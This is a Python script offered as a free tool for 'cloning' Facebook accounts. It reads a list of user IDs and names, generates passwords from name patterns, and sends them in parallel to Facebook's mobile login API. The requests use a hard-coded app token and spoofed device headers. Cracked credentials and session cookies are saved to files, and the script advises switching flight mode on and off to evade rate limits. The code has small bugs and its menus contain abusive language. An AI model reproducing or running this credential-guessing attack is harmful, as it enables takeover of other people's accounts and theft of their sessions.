#coding = utf-8
#This Open-Source Script is Written by Aqib Ali Khan
#Please Donot Forget to give Credit 
#Whatsapp : +923152056613
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Author    : Dilute Codes( Aqib Ali )
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : Dilute Codes
 ╰◈▪➣ Version   : DC Extreme [1.2]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v2331045816051009255 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v8397889345828626328 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v3164209381198372835 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4375459178076388605 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v3334451131168842498 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v15693327219 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4933472726 t5199148406380373965 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7832581946274421574 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9007183708562689181 t488722792856863838 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v530671531418920673 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0",])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus (2022) Build/S3RDES32.123-37-4-6)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-10-17-3-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RI32.32-20-9-9-2)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TNS33.14-63-5-2)","Dalvik/2.1.0 (Linux; U; Android 11; IRIS 2K SmartTV Build/RTM5.220609.189)","Dalvik/2.1.0 (Linux; U; Android 13; G65 Build/TP1A.220624.014)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; CVTE_MSD338_1G Build/86b8f06e_20180321_173020)","Dalvik/2.1.0 (Linux; U; Android 10; H20 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 11; moto g 5G Build/RZK31.Q3-25-18-7)","Dalvik/2.1.0 (Linux; U; Android 5.0; M2 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 13; SOG07 Build/65.1.C.4.80)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 5 Build/UPB5.230623.003)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-16)","Dalvik/2.1.0 (Linux; U; Android 11; TK806_EEA Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; I409 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ3A.230805.001.A2)","Dalvik/2.1.0 (Linux; U; Android 11; MyRepublic STB Build/RT)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L21 Build/HUAWEIATU-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J3308 Build/M1AJQ)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor 13 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO LH7n Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2STS32.71-105-5)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N975U Build/SP1A.210812.016)OktaMobile/4.24.1","Dalvik/2.1.0 (Linux; U; Android 12; unifi-TV Build/STTC.220815.001)","Dalvik/2.1.0 (Linux; U; Android 11; F VIZZION TV Build/RTM6.230109.068)","Dalvik/2.1.0 (Linux; U; Android 11; Connect TV de SFR Build/RT)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; STI6030 Build/OPR6.170623.013)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G965N Build/PQ3B.190801.08041932)","Dalvik/2.1.0 (Linux; U; Android 11; CORN Note1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; Surface Duo 2 Build/2023.429.46)","Dalvik/2.1.0 (Linux; U; Android 9; LEMP Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; M3 Build/M3_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; 21061119BI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; Formuler Z11 Pro MAX Build/RVC)","Dalvik/2.1.0 (Linux; U; Android 10; Infinix X682B Build/QP1A.190711.020) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-N960F Build/M1AJQ) AppleWebKit [PB/113]","Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S7033)","Dalvik/2.1.0 (Linux; U; Android 12; S9-KC Build/SKQ1.220303.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F946U Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; Note11 Pro Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; PRIME 1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; X96 MINI Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; AGM3-W09HN Build/HONORAGM3-W09HN)","Dalvik/2.1.0 (Linux; U; Android 10; Altibox TV Build/QTG1.221101.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ3A.230805.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40S_ROW Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android Android10.0OS; BossV4 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/UPB5.230623.003)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R114-15437.63.0)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R116-15509.50.0)","Dalvik/2.1.0 (Linux; U; Android 12; LEAP-S1 Build/STTC.220815.001)","Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) AppleWebKit [PB/113]","Dalvik/2.1.0 (Linux; U; Android 11; BRAVIA TL2 Build/RTM2.210929.098)","Dalvik/2.1.0 (Linux; U; Android 10; TRANSVISION-Xstream Build/QTT8.201201.004)","Dalvik/2.1.0 (Linux; U; Android 13; PEQM00 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R115-15474.70.0)","Dalvik/2.1.0 (Linux; U; Android 9; Flare S8 Max Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; MAGNO C2 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Z6251 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-6-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R115-15474.70.0)","Dalvik/2.1.0 (Linux; U; Android 11; M7_WIFI Build/V11_20230419)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S2SDS32.21-85-3-2-1-5)","Dalvik/2.1.0 (Linux; U; Android 11; P25_EEA Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; T768S Build/RKQ1.210614.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-3-6)","Dalvik/2.1.0 (Linux; U; Android 10; DAZN Build/QTG1.210627.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTR Build/PS7652.3556N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-15)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R115-15474.70.0)","Dalvik/2.1.0 (Linux; U; Android 9; X1-Prime-c Build/PTT1.190604.001)","Dalvik/2.1.0 (Linux; U; Android 11; POLYTRON2K Build/RTM3.211215.220)","Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVX22A Build/RTM6.230109.052)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-C7100 Build/M1AJQ) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; BboxTV Build/PTT1.201118.001)","Dalvik/2.1.0 (Linux; U; Android 10; Nokia 3.1 Plus Build/QP1A.190711.020) VD/238","Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro1 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 9; HYUNDAI 2K Android TV Build/PTO2.210830.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G - 2023 Build/T1TPNS33.58-68-2)","Dalvik/2.1.0 (Linux; U; Android 13; Lenovo YT-K606F Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; KINGKONG POWER Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; ALLVIEW 2K Android TV Build/RTO8.230530.001)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO CI6 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230805.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT1-mini Build/OPM1.171019.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ3A.230705.001.B4)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.dd.6330.d4 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; iHunt Cyber Shark 4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 6.0; XT1069 Build/MPB24.65-34)","Dalvik/2.1.0 (Linux; U; Android 11; volteer Build/R114-15437.63.0)","Dalvik/2.1.0 (Linux; U; Android 11; AQUA Android TV DVB Build/RTM6.230109.194)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; LDN-L21 Build/HUAWEILDN-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; NOH-NX9 Build/HUAWEINOH-N29) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; AirMax Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; 5130E Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G - 2023 Build/T1TPNS33.58-37-1)","Dalvik/2.1.0 (Linux; U; Android 11; Bengal for arm Build/RKQ1.210526.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STBS32.36-102-1)",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by Aqib Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()